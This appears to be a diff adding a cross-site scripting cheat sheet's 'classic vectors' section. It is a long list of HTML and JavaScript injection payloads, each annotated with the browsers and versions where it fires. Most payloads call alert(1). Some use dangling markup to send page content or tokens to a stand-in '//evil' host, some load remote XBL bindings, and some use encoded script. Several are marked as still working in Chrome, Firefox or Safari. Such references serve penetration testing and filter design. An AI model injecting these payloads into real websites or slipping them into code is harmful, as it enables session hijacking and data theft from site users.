@@ -1,0 +1,217 @@
+Classic vectors (XSS crypt)
+Image src with JavaScript protocol
+
+<img src="javascript:alert(1)">
+Jump to the code
+Body background with JavaScript protocol
+
+<body background="javascript:alert(1)">
+Jump to the code
+Iframe data urls no longer work as modern browsers use a null origin
+
+<iframe src="data:text/html,<img src=1 onerror=alert(document.domain)>">
+Jump to the code
+VBScript protocol used to work in IE
+
+<a href="vbscript:MsgBox+1">XSS</a> <a href="#" onclick="vbs:Msgbox+1">XSS</a> <a href="#" onclick="VBS:Msgbox+1">XSS</a> <a href="#" onclick="vbscript:Msgbox+1">XSS</a> <a href="#" onclick="VBSCRIPT:Msgbox+1">XSS</a> <a href="#" language=vbs onclick="vbscript:Msgbox+1">XSS</a>
+Jump to the code
+JScript compact was a minimal version of JS that wasn't widely used in IE
+
+<a href="#" onclick="jscript.compact:alert(1);">test</a> <a href="#" onclick="JSCRIPT.COMPACT:alert(1);">test</a>
+Jump to the code
+JScript.Encode allows encoded JavaScript
+
+<a href=# language="JScript.Encode" onclick="#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a> <a href=# onclick="JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>
+Jump to the code
+VBScript.Encoded allows encoded VBScript
+
+<iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@> <iframe language=VBScript.Encode onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
+Jump to the code
+JavaScript entities used to work in Netscape Navigator
+
+<a title="&{alert(1)}">XSS</a>
+Jump to the code
+JavaScript stylesheets used to be supported by Netscape Navigator
+
+<link href="xss.js" rel=stylesheet type="text/javascript">
+Jump to the code
+Button used to consume markup
+
+<form><button name=x formaction=x><b>stealme
+Jump to the code
+IE9 select elements and plaintext used to consume markup
+
+<form action=x><button>XSS</button><select name=x><option><plaintext><script>token="supersecret"</script>
+Jump to the code
+XBL Firefox only <= 2
+
+<div style="-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)"> <div style="\-\mo\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)"> <div style="-moz-bindin\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)"> <div style="-moz-bindin&#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)">
+Jump to the code
+XBL also worked in FF3.5 using data urls
+
+<img src="blah" style="-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)" />
+Jump to the code
+CSS expressions <=IE7
+
+<div style=xss:expression(alert(1))> <div style=xss:expression(1)-alert(1)> <div style=xss:expressio\6e(alert(1))> <div style=xss:expressio\006e(alert(1))> <div style=xss:expressio\00006e(alert(1))> <div style=xss:expressio\6e(alert(1))> <div style=xss:expressio&#x5c;6e(alert(1))>
+Jump to the code
+In quirks mode IE allowed you to use = instead of :
+
+<div style=xss=expression(alert(1))> <div style="color&#x3dred">test</div>
+Jump to the code
+Behaviors for older modes of IE
+
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XSS</a>
+Jump to the code
+Older versions of IE supported event handlers in functions
+
+<script> function window.onload(){ alert(1); } </script> <script> function window::onload(){ alert(1); } </script> <script> function window.location(){ } </script> <body> <script> function/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){} </script> </body> <body> <script> function document.body.innerHTML(){ x = "<img src=1 onerror=alert(1)>"; } </script> </body>
+Jump to the code
+GreyMagic HTML+time exploit (no longer works even in 5 docmode)
+
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<img src=1 onerror=alert(1)>"> </BODY></HTML>
+Jump to the code
+Works in Firefox
+Firefox allows NULLS after &
+
+<a href="javascript&#x6a;avascript:alert(1)">Firefox</a>
+Jump to the code
+Works in Firefox
+Firefox allows NULLs inside named entities
+
+<a href="javascript&colon;alert(1)">Firefox</a>
+Jump to the code
+Works in Firefox
+Firefox allows NULL characters inside opening comments
+
+<!-- ><img title="--><iframe/onload=alert(1)>"> --> <!-- ><img title="--><iframe/onload=alert(1)>"> -->
+Jump to the code
+Works in Safari
+Safari used to allow any tag to have a onload event inside SVG
+
+<svg><xss onload=alert(1)>
+Jump to the code
+Isindex using src attribute
+
+<isindex type=image src="//evil?
+Jump to the code
+Isindex using submit
+
+<isindex type=submit style=width:100%;height:100%; value=XSS formaction="//evil?
+Jump to the code
+Isindex and formaction
+
+<isindex type=submit formaction=javascript:alert(1)>
+Jump to the code
+Isindex and action
+
+<isindex type=submit action=javascript:alert(1)>
+Jump to the code
+Works in Chrome
+discard tag and onbegin
+
+<svg><discard onbegin=alert(1)>
+Jump to the code
+Use element with an external URL
+
+<svg><use href="//subdomain1.portswigger-labs.net/use_element/upload.php#x" /></svg>
+Jump to the code
+Works in Firefox
+onloadstart event for media elements in Firefox v107 and below
+
+<img src=validimage.png onloadstart=alert(1)>
+Jump to the code
+Works in Firefox
+onloadend event for media elements in Firefox v107 and below
+
+<input type=image onloadend=alert(1) src=validimage.png>
+Jump to the code
+Works in Firefox
+onbounce event for marquee element in Firefox v125 and below
+
+<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>
+Jump to the code
+Works in Firefox
+onfinish event for marquee element in Firefox v125 and below
+
+<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>
+Jump to the code
+Works in Firefox
+onstart event for marquee element in Firefox v125 and below
+
+<marquee onstart=alert(1)>XSS</marquee>
+Jump to the code
+Works in Firefox
+onshow event for menu element in Firefox v102 and below
+
+<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>
+Jump to the code
+Works in Chrome Works in Safari
+Assignable protocol with location
+
+<script>location.protocol='javascript'</script>
+Jump to the code
+Works in Chrome Works in Safari
+Assignable protocol with anchor
+
+<a href="%0aalert(1)" onclick="protocol='javascript'">test</a>
+Jump to the code
+Works in Chrome Works in Firefox
+Data URL with use element and base64 encoded
+
+<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg>
+Jump to the code
+Works in Chrome Works in Firefox
+Data URL with use element
+
+<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
+Jump to the code
+Works in Chrome Works in Firefox Works in Safari
+JavaScript protocol with new line
+
+<a href="javascript://%0aalert(1)">XSS</a>
+Jump to the code
+Works in Safari
+Base tag with JavaScript protocol rewriting relative URLS
+
+<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a>
+Jump to the code
+Works in Firefox
+Object data attribute with JavaScript protocol in Firefox 140 and below
+
+<object data="javascript:alert(1)">
+Jump to the code
+Works in Firefox
+Embed src attribute with JavaScript protocol in Firefox 140 and below
+
+<embed src="javascript:alert(1)">
+Jump to the code
+Works in Firefox
+Object data and codebase in Firefox v140 and below
+
+<object data=# codebase=javascript:alert(document.domain)//>
+Jump to the code
+Works in Firefox
+Embed src and codebase in Firefox v140 and below
+
+<embed src=# codebase=javascript:alert(document.domain)//>
+Jump to the code
+Works in Firefox
+Object data and codebase with single line comment in Firefox v140 and below
+
+<object data="# alert(1)" codebase=javascript://>
+Jump to the code
+Works in Firefox
+Object data and codebase and hash bang in Firefox v140 and below
+
+<object data="#! alert(1)" codebase=javascript:>
+Jump to the code
+Works in Firefox
+Embed src and codebase with single line comment in Firefox v140 and below
+
+<embed src="# alert(1)" codebase=javascript://>
+Jump to the code
+Works in Firefox
+Embed src and codebase and hash bang in Firefox v140 and below
+
+<embed src="#! alert(1)" codebase=javascript:>
